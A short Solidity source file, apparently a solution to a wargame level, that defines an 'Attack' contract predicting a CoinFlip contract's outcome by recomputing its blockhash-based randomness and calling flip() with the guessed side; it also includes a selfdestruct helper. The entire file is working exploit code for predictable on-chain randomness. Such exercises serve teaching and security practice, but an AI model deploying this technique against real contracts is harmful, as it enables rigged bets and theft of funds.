// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.6.0;

import "interfaces/ICoinFlip.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract Attack {
    //* from inteface
    CoinFlip coin_flip_contract;

    using SafeMath for uint256;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    //? No new keyword bcz we want ot inreact with the origianl contract
    constructor(address _address) public {
        coin_flip_contract = CoinFlip(_address);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        bool result = coin_flip_contract.flip(side);
        require(result);
    }

    //* clean the contract
    function selfDestruct() public {
        selfdestruct(msg.sender);
    }
}
